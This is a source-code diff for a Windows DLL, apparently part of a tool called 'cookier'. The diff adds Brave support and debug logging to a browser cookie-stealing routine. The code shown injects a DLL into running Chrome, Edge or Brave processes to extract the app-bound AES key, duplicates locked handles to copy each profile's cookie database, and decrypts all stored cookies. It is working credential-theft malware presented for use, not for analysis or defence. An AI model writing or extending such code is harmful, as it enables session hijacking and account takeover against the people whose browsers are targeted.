@@ -18,6 +18,7 @@
 #include <sstream>
 #include <cstring>
 #include <cstdio>
+#include <cstdarg>
 
 #pragma comment(lib, "bcrypt.lib")
 #pragma comment(lib, "crypt32.lib")
@@ -33,8 +34,44 @@
 namespace fs = std::filesystem;
 
 static bool g_verbose = false;
+static bool g_debug = false;
 static const char* KEY_CHROME = "C:\\Users\\Public\\chrome_abe_key.bin";
 static const char* KEY_EDGE   = "C:\\Users\\Public\\edge_abe_key.bin";
+static const char* KEY_BRAVE  = "C:\\Users\\Public\\brave_abe_key.bin";
+
+static void Log(const char* src, const char* fmt, ...) {
+    if (!g_debug) return;
+    char msg[2048];
+    va_list ap; va_start(ap, fmt);
+    _vsnprintf_s(msg, sizeof(msg), _TRUNCATE, fmt, ap);
+    va_end(ap);
+    SYSTEMTIME st; GetLocalTime(&st);
+    char line[2300];
+    int n = _snprintf_s(line, sizeof(line), _TRUNCATE,
+        "[%02d:%02d:%02d.%03d] [%-8s] [pid=%5lu] %s\r\n",
+        st.wHour, st.wMinute, st.wSecond, st.wMilliseconds,
+        src, GetCurrentProcessId(), msg);
+    if (n < 0) n = (int)strlen(line);
+    if (n <= 0) return;
+    HANDLE h = CreateFileW(L"C:\\Users\\Public\\cookier_debug.log",
+        FILE_APPEND_DATA, FILE_SHARE_READ | FILE_SHARE_WRITE,
+        NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+    if (h != INVALID_HANDLE_VALUE) {
+        DWORD w; WriteFile(h, line, (DWORD)n, &w, NULL); CloseHandle(h);
+    }
+}
+
+static void EnableDebug(bool enable) {
+    g_debug = enable;
+    if (enable) {
+        HANDLE h = CreateFileW(L"C:\\Users\\Public\\cookier_debug.log",
+            GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+        if (h != INVALID_HANDLE_VALUE) CloseHandle(h);
+        h = CreateFileW(L"C:\\Users\\Public\\cookier_debug_enabled",
+            GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+        if (h != INVALID_HANDLE_VALUE) CloseHandle(h);
+    }
+}
 
 static std::string Narrow(const std::wstring& w) {
     if (w.empty()) return {};
@@ -74,17 +111,33 @@ static void EnablePrivilege(LPCWSTR privilege) {
 }
 
 static std::wstring ProcessName(const std::string& browser) {
-    return browser == "edge" ? L"msedge.exe" : L"chrome.exe";
+    if (browser == "edge")  return L"msedge.exe";
+    if (browser == "brave") return L"brave.exe";
+    return L"chrome.exe";
 }
 
 static std::wstring UserDataPath(const std::string& browser) {
     PWSTR local = nullptr; SHGetKnownFolderPath(FOLDERID_LocalAppData, 0, nullptr, &local);
     std::wstring p(local); CoTaskMemFree(local);
-    return p + (browser == "edge" ? L"\\Microsoft\\Edge\\User Data" : L"\\Google\\Chrome\\User Data");
+    if (browser == "edge")  return p + L"\\Microsoft\\Edge\\User Data";
+    if (browser == "brave") return p + L"\\BraveSoftware\\Brave-Browser\\User Data";
+    return p + L"\\Google\\Chrome\\User Data";
 }
 
 static const char* KeyFileFor(const std::string& browser) {
-    return browser == "edge" ? KEY_EDGE : KEY_CHROME;
+    if (browser == "edge")  return KEY_EDGE;
+    if (browser == "brave") return KEY_BRAVE;
+    return KEY_CHROME;
+}
+
+static std::wstring ReadRegStr(HKEY root, LPCWSTR subkey, LPCWSTR value) {
+    HKEY h;
+    if (RegOpenKeyExW(root, subkey, 0, KEY_READ, &h) != ERROR_SUCCESS) return L"";
+    wchar_t buf[MAX_PATH * 2]; DWORD sz = sizeof(buf); DWORD type = 0;
+    LSTATUS s = RegQueryValueExW(h, value, nullptr, &type, (LPBYTE)buf, &sz);
+    RegCloseKey(h);
+    if (s != ERROR_SUCCESS || type != REG_SZ) return L"";
+    return std::wstring(buf);
 }
 
 static std::wstring FindBrowserExe(const std::string& browser) {
@@ -92,11 +145,24 @@ static std::wstring FindBrowserExe(const std::string& browser) {
     if (browser == "edge") {
         candidates = { L"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe",
                        L"C:\\Program Files\\Microsoft\\Edge\\Application\\msedge.exe" };
+    } else if (browser == "brave") {
+        std::wstring reg = ReadRegStr(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\brave.exe", L"");
+        if (!reg.empty() && fs::exists(reg)) { Log("PROVIDER", "FindBrowserExe[brave] via HKLM App Paths -> %ls", reg.c_str()); return reg; }
+        reg = ReadRegStr(HKEY_LOCAL_MACHINE, L"SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\App Paths\\brave.exe", L"");
+        if (!reg.empty() && fs::exists(reg)) { Log("PROVIDER", "FindBrowserExe[brave] via HKLM WOW64 App Paths -> %ls", reg.c_str()); return reg; }
+        candidates = { L"C:\\Program Files\\BraveSoftware\\Brave-Browser\\Application\\brave.exe",
+                       L"C:\\Program Files (x86)\\BraveSoftware\\Brave-Browser\\Application\\brave.exe" };
+        PWSTR local = nullptr;
+        if (SUCCEEDED(SHGetKnownFolderPath(FOLDERID_LocalAppData, 0, nullptr, &local))) {
+            candidates.push_back(std::wstring(local) + L"\\BraveSoftware\\Brave-Browser\\Application\\brave.exe");
+            CoTaskMemFree(local);
+        }
     } else {
         candidates = { L"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
                        L"C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe" };
     }
-    for (auto& p : candidates) if (fs::exists(p)) return p;
+    for (auto& p : candidates) if (fs::exists(p)) { Log("PROVIDER", "FindBrowserExe[%s] -> %ls", browser.c_str(), p.c_str()); return p; }
+    Log("PROVIDER", "FindBrowserExe[%s] -> NOT FOUND", browser.c_str());
     return L"";
 }
 
@@ -104,7 +170,9 @@ static std::vector<DWORD> GetPids(const std::wstring& name) {
     std::vector<DWORD> pids; PROCESSENTRY32W pe = { sizeof(pe) };
     HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
     if (Process32FirstW(snap, &pe)) { do { if (_wcsicmp(pe.szExeFile, name.c_str()) == 0) pids.push_back(pe.th32ProcessID); } while (Process32NextW(snap, &pe)); }
-    CloseHandle(snap); return pids;
+    CloseHandle(snap);
+    Log("PROVIDER", "GetPids[%ls] -> %zu pid(s)", name.c_str(), pids.size());
+    return pids;
 }
 
 static void KillPids(const std::vector<DWORD>& pids) {
@@ -112,10 +180,11 @@ static void KillPids(const std::vector<DWORD>& pids) {
 }
 
 static int InjectDll(const std::string& dllPathA, DWORD pid) {
+    Log("PROVIDER", "InjectDll -> pid=%lu", pid);
     HANDLE hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, pid);
-    if (!hProcess) return 0;
+    if (!hProcess) { Log("PROVIDER", "InjectDll: OpenProcess(pid=%lu) failed err=%lu", pid, GetLastError()); return 0; }
     LPVOID remoteMem = VirtualAllocEx(hProcess, nullptr, dllPathA.size() + 1, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-    if (!remoteMem) { CloseHandle(hProcess); return 0; }
+    if (!remoteMem) { Log("PROVIDER", "InjectDll: VirtualAllocEx failed"); CloseHandle(hProcess); return 0; }
     WriteProcessMemory(hProcess, remoteMem, dllPathA.c_str(), dllPathA.size() + 1, nullptr);
     HMODULE hKernel32 = GetModuleHandleW(L"kernel32.dll");
     HANDLE hThread = CreateRemoteThread(hProcess, nullptr, 0, (LPTHREAD_START_ROUTINE)GetProcAddress(hKernel32, "LoadLibraryA"), remoteMem, 0, nullptr);
@@ -128,21 +197,25 @@ static int InjectDll(const std::string& dllPathA, DWORD pid) {
                 char szModName[MAX_PATH];
                 if (GetModuleFileNameExA(hProcess, hMods[i], szModName, sizeof(szModName))) {
                     if (std::string(szModName).find("ChromiumInjector_") != std::string::npos) {
+                        Log("PROVIDER", "InjectDll: ChromiumInjector loaded in pid=%lu at %s", pid, szModName);
                         HMODULE hLocal = LoadLibraryExA(dllPathA.c_str(), NULL, DONT_RESOLVE_DLL_REFERENCES);
                         if (hLocal) {
                             DWORD_PTR offset = (DWORD_PTR)GetProcAddress(hLocal, "TriggerDecryption") - (DWORD_PTR)hLocal;
                             FreeLibrary(hLocal);
                             LPVOID remoteFunc = (LPVOID)((DWORD_PTR)hMods[i] + offset);
                             HANDLE hTrigger = CreateRemoteThread(hProcess, nullptr, 0, (LPTHREAD_START_ROUTINE)remoteFunc, nullptr, 0, nullptr);
-                            if (hTrigger) { WaitForSingleObject(hTrigger, INFINITE); CloseHandle(hTrigger); result = 1; }
+                            if (hTrigger) { WaitForSingleObject(hTrigger, INFINITE); CloseHandle(hTrigger); result = 1; Log("PROVIDER", "InjectDll: TriggerDecryption completed in pid=%lu", pid); }
                         }
                         break;
                     }
                 }
             }
         }
+    } else {
+        Log("PROVIDER", "InjectDll: CreateRemoteThread failed err=%lu", GetLastError());
     }
-    VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE); CloseHandle(hProcess); return result;
+    VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE); CloseHandle(hProcess);
+    return result;
 }
 
 #define STATUS_INFO_LENGTH_MISMATCH ((NTSTATUS)0xC0000004L)
@@ -175,7 +248,7 @@ static std::unordered_map<std::wstring, HANDLE> CopyCookiesViaHandleDuplication(
         if (status == STATUS_INFO_LENGTH_MISMATCH) { bufSize = returned + 0x10000; continue; }
         break;
     }
-    if (status < 0) return locked;
+    if (status < 0) { Log("PROVIDER", "CopyCookiesViaHandleDuplication: NtQuerySystemInformation failed 0x%08lx", (unsigned long)status); return locked; }
     auto info = reinterpret_cast<PSYSTEM_HANDLE_INFORMATION_EX>(buffer.data());
     std::unordered_map<DWORD, HANDLE> procHandles;
     for (DWORD pid : pids) { HANDLE h = OpenProcess(PROCESS_DUP_HANDLE | PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid); if (h) procHandles[pid] = h; }
@@ -188,7 +261,7 @@ static std::unordered_map<std::wstring, HANDLE> CopyCookiesViaHandleDuplication(
                 if (len > 0) {
                     std::wstring p(path, len);
                     if (p.find(L"Network\\Cookies") != std::wstring::npos) {
-                        if (locked.find(p) == locked.end()) { locked[p] = hDup; continue; }
+                        if (locked.find(p) == locked.end()) { locked[p] = hDup; Log("PROVIDER", "handle-dup captured: %ls", p.c_str()); continue; }
                     }
                 }
             }
@@ -196,6 +269,7 @@ static std::unordered_map<std::wstring, HANDLE> CopyCookiesViaHandleDuplication(
         }
     }
     for (auto& pair : procHandles) CloseHandle(pair.second);
+    Log("PROVIDER", "CopyCookiesViaHandleDuplication: %zu locked handle(s)", locked.size());
     return locked;
 }
 
@@ -203,24 +277,25 @@ static std::vector<std::wstring> GetProfilesOnDisk(const std::wstring& userDataD
     std::vector<std::wstring> profiles;
     try {
         for (const auto& entry : fs::directory_iterator(userDataDir, fs::directory_options::skip_permission_denied)) {
-            try { if (entry.is_directory()) { fs::path c = entry.path() / L"Network" / L"Cookies"; if (fs::exists(c)) profiles.push_back(entry.path().filename().wstring()); } } catch (...) {}
+            try { if (entry.is_directory()) { fs::path c = entry.path() / L"Network" / L"Cookies"; if (fs::exists(c)) { profiles.push_back(entry.path().filename().wstring()); } } } catch (...) {}
         }
     } catch (...) {}
+    Log("PROVIDER", "GetProfilesOnDisk: %zu profile(s)", profiles.size());
     return profiles;
 }
 
-// Returns pretty-printed cookie objects (4-space base indent), WITHOUT the outer [ ].
-// Caller is responsible for wrapping in [ ] and choosing the surrounding indent.
 static std::string ExtractCookiesFromDb(const std::wstring& dbPath, const std::vector<BYTE>& aesKey) {
     sqlite3* db = nullptr;
-    if (sqlite3_open_v2(Narrow(dbPath).c_str(), &db, SQLITE_OPEN_READONLY, nullptr) != SQLITE_OK) { if (db) sqlite3_close(db); return ""; }
+    if (sqlite3_open_v2(Narrow(dbPath).c_str(), &db, SQLITE_OPEN_READONLY, nullptr) != SQLITE_OK) { if (db) sqlite3_close(db); Log("PROVIDER", "ExtractCookiesFromDb: open failed"); return ""; }
     sqlite3_stmt* stmt = nullptr;
-    if (sqlite3_prepare_v2(db, "SELECT host_key, name, encrypted_value, path, expires_utc, is_secure, is_httponly FROM cookies;", -1, &stmt, nullptr) != SQLITE_OK) { sqlite3_close(db); return ""; }
+    if (sqlite3_prepare_v2(db, "SELECT host_key, name, encrypted_value, path, expires_utc, is_secure, is_httponly FROM cookies;", -1, &stmt, nullptr) != SQLITE_OK) { sqlite3_close(db); Log("PROVIDER", "ExtractCookiesFromDb: prepare failed"); return ""; }
 
     std::string out; out.reserve(16384);
     bool first = true;
+    int rows = 0, decrypted = 0;
 
     while (sqlite3_step(stmt) == SQLITE_ROW) {
+        rows++;
         const unsigned char* hk = sqlite3_column_text(stmt, 0);
         const unsigned char* nm = sqlite3_column_text(stmt, 1);
         const void* enc = sqlite3_column_blob(stmt, 2); int encLen = sqlite3_column_bytes(stmt, 2);
@@ -239,6 +314,7 @@ static std::string ExtractCookiesFromDb(const std::wstring& dbPath, const std::v
                     ai.pbNonce = (PUCHAR)enc + 3; ai.cbNonce = 12; ai.pbTag = (PUCHAR)enc + encLen - 16; ai.cbTag = 16;
                     std::vector<BYTE> plain(encLen - 31); ULONG plainLen = 0;
                     if (BCRYPT_SUCCESS(BCryptDecrypt(hKey, (PUCHAR)enc + 15, encLen - 31, &ai, nullptr, 0, plain.data(), (ULONG)plain.size(), &plainLen, 0))) {
+                        decrypted++;
                         BYTE* pData = plain.data(); ULONG dataLen = plainLen;
                         if (hk && dataLen >= 32) {
                             BCRYPT_ALG_HANDLE hSha; BCRYPT_HASH_HANDLE hHash = NULL; BYTE hash[32] = {};
@@ -253,7 +329,7 @@ static std::string ExtractCookiesFromDb(const std::wstring& dbPath, const std::v
                             }
                         }
                         value.assign(pData, pData + dataLen);
-                    }
+                    } else { Log("PROVIDER", "BCryptDecrypt failed for host=%s name=%s", (const char*)hk, (const char*)nm); }
                     BCryptDestroyKey(hKey);
                 }
                 BCryptCloseAlgorithmProvider(hAlg, 0);
@@ -274,21 +350,28 @@ static std::string ExtractCookiesFromDb(const std::wstring& dbPath, const std::v
     }
 
     sqlite3_finalize(stmt); sqlite3_close(db);
+    Log("PROVIDER", "ExtractCookiesFromDb: %d row(s), %d decrypted", rows, decrypted);
     return out;
 }
 
 extern "C" PROVIDER_API bool ExtractCookies(char** outJson, const char* browserName, const char* profileList, bool verbose) {
     g_verbose = verbose;
+    EnableDebug(verbose);
     std::string browser = browserName ? browserName : "chrome";
+    Log("PROVIDER", "===== ExtractCookies start: browser=%s profiles=%s verbose=%d =====", browser.c_str(), profileList ? profileList : "(null)", verbose ? 1 : 0);
+
     CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);
     EnablePrivilege(L"SeDebugPrivilege"); EnablePrivilege(L"SeBackupPrivilege");
     bool weLaunched = false;
 
     try {
-        DeleteFileA(KEY_CHROME); DeleteFileA(KEY_EDGE);
+        DeleteFileA(KEY_CHROME); DeleteFileA(KEY_EDGE); DeleteFileA(KEY_BRAVE);
         std::wstring userDataDir = UserDataPath(browser);
         std::wstring processName = ProcessName(browser);
         const char* keyFile = KeyFileFor(browser);
+        Log("PROVIDER", "userDataDir=%ls", userDataDir.c_str());
+        Log("PROVIDER", "processName=%ls", processName.c_str());
+        Log("PROVIDER", "keyFile=%s", keyFile);
 
         auto allProfiles = GetProfilesOnDisk(userDataDir);
         std::vector<std::wstring> targetProfiles;
@@ -301,6 +384,7 @@ extern "C" PROVIDER_API bool ExtractCookies(char** outJson, const char* browserN
                 for (auto& p : allProfiles) if (p == w) { targetProfiles.push_back(p); break; }
             }
         }
+        Log("PROVIDER", "targetProfiles=%zu", targetProfiles.size());
 
         wchar_t tempPath[MAX_PATH]; GetTempPathW(MAX_PATH, tempPath);
         std::wstring dllPath = std::wstring(tempPath) + L"ChromiumInjector_" + std::to_wstring(GetCurrentProcessId()) + L".dll";
@@ -309,9 +393,10 @@ extern "C" PROVIDER_API bool ExtractCookies(char** outJson, const char* browserN
         HMODULE hSelf = NULL;
         GetModuleHandleExW(GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS | GET_MODULE_HANDLE_EX_FLAG_UNCHANGED_REFCOUNT, (LPCWSTR)ExtractCookies, &hSelf);
         HRSRC hRes = FindResourceW(hSelf, MAKEINTRESOURCEW(101), MAKEINTRESOURCEW(10));
-        if (!hRes) throw std::runtime_error("Failed to find ChromiumInjector resource in provider DLL");
+        if (!hRes) { Log("PROVIDER", "FindResource(101) FAILED"); throw std::runtime_error("Failed to find ChromiumInjector resource in provider DLL"); }
         HGLOBAL hMem = LoadResource(hSelf, hRes); void* pData = LockResource(hMem); DWORD sz = SizeofResource(hSelf, hRes);
         std::ofstream ofs(dllPath, std::ios::binary); ofs.write((char*)pData, sz); ofs.close();
+        Log("PROVIDER", "wrote injector to %ls (%lu bytes)", dllPath.c_str(), sz);
 
         std::string dllPathA = Narrow(dllPath);
         auto pids = GetPids(processName);
@@ -324,20 +409,27 @@ extern "C" PROVIDER_API bool ExtractCookies(char** outJson, const char* browserN
             PROCESS_INFORMATION pi = {};
             std::wstring cmd = L"\"" + exe + L"\" --no-first-run --disable-gpu about:blank";
             std::vector<wchar_t> cmdBuf(cmd.begin(), cmd.end()); cmdBuf.push_back(L'\0');
-            CreateProcessW(nullptr, cmdBuf.data(), nullptr, nullptr, FALSE, CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi);
+            BOOL ok = CreateProcessW(nullptr, cmdBuf.data(), nullptr, nullptr, FALSE, CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi);
+            Log("PROVIDER", "CreateProcess(%ls) -> %d", exe.c_str(), ok);
             CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
             for (int i = 0; i < 10; ++i) { std::this_thread::sleep_for(std::chrono::seconds(1)); pids = GetPids(processName); if (!pids.empty()) break; }
         }
 
-        if (pids.empty()) throw std::runtime_error(browser + " not running and failed to launch");
+        if (pids.empty()) { Log("PROVIDER", "no pids -> throwing"); throw std::runtime_error(browser + " not running and failed to launch"); }
         for (DWORD pid : pids) InjectDll(dllPathA, pid);
 
         bool keyFound = false;
-        for (int i = 0; i < 20; ++i) { std::this_thread::sleep_for(std::chrono::milliseconds(200)); if (GetFileAttributesA(keyFile) != INVALID_FILE_ATTRIBUTES) { keyFound = true; break; } }
-        if (!keyFound) throw std::runtime_error("Timed out waiting for AES key");
+        Log("PROVIDER", "waiting for key file (100 x 200ms = 20s max)");
+        for (int i = 0; i < 100; ++i) {
+            std::this_thread::sleep_for(std::chrono::milliseconds(200));
+            if (GetFileAttributesA(keyFile) != INVALID_FILE_ATTRIBUTES) { keyFound = true; Log("PROVIDER", "key file appeared at tick=%d (%dms)", i, (i + 1) * 200); break; }
+            if (i > 0 && (i % 10) == 0) Log("PROVIDER", "wait progress: %d/100", i);
+        }
+        if (!keyFound) { Log("PROVIDER", "TIMEOUT: key file never appeared"); throw std::runtime_error("Timed out waiting for AES key"); }
 
         std::ifstream kf(keyFile, std::ios::binary);
         std::vector<BYTE> aesKey((std::istreambuf_iterator<char>(kf)), {});
+        Log("PROVIDER", "AES key size=%zu (expected 32)", aesKey.size());
         if (aesKey.size() != 32) throw std::runtime_error("Invalid AES key length");
 
         auto locked = CopyCookiesViaHandleDuplication(pids);
@@ -360,6 +452,7 @@ extern "C" PROVIDER_API bool ExtractCookies(char** outJson, const char* browserN
             bool copied = false;
             if (hDb) copied = CopyHandleToFile(hDb, destDb);
             else if (fs::exists(dbPath)) copied = CopyFileW(dbPath.c_str(), destDb.c_str(), FALSE);
+            Log("PROVIDER", "profile=%ls copied=%d hDb=%p hWal=%p hShm=%p", profile.c_str(), copied ? 1 : 0, hDb, hWal, hShm);
             if (!copied) continue;
 
             std::wstring walPath = dbPath + L"-wal"; std::wstring destWal = destBase + L".db-wal";
@@ -392,11 +485,15 @@ extern "C" PROVIDER_API bool ExtractCookies(char** outJson, const char* browserN
         DeleteFileA(keyFile); DeleteFileW(dllPath.c_str());
         if (weLaunched) KillPids(pids);
         CoUninitialize();
+        Log("PROVIDER", "===== ExtractCookies SUCCESS: out=%zu bytes =====", out.size());
+        DeleteFileW(L"C:\\Users\\Public\\cookier_debug_enabled");
         return true;
     } catch (const std::exception& e) {
         std::cerr << "[!] ChromiumProvider Error: " << e.what() << "\n";
+        Log("PROVIDER", "===== ExtractCookies FAILED: %s =====", e.what());
         if (weLaunched) { auto p = GetPids(ProcessName(browser)); KillPids(p); }
         CoUninitialize();
+        DeleteFileW(L"C:\\Users\\Public\\cookier_debug_enabled");
         return false;
     }
 }
